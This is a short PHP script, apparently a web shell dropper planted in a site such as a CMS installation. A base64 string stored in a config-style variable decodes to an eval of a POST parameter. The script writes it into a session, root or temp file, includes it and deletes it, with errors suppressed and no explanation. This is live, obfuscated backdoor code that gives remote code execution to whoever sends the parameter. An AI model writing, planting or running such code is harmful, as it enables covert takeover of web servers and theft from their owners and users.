<?php

    $cfg_ml='PD9waHAgQGV2YWwoJF9QT1NUWydndWlnZSddKT8+';


    $cfg_ml = base64_decode($cfg_ml);
    $t = md5(mt_rand(1,100));

    $f=$_SERVER['DOCUMENT_ROOT'].'/data/sessions/sess_'.$t;
    @file_put_contents($f,$cfg_ml);
    if(!file_exists($f))
    {    
        $f=$t;
        @file_put_contents($f,$cfg_ml);
    }
    if(!file_exists($f))
    {
        $f=$_SERVER['DOCUMENT_ROOT'].'/a/'.$t;
        @file_put_contents($f,$cfg_ml);
    }
    if(!file_exists($f))
    {

        $f=$_SERVER['DOCUMENT_ROOT'].'/'.$t;
        @file_put_contents($f,$cfg_ml);
    }
    if(!file_exists($f))
    {
        $f='/tmp/'.$t;
        @file_put_contents($f,$cfg_ml);
    } 

    @include($f);
    @unlink($f);  

?>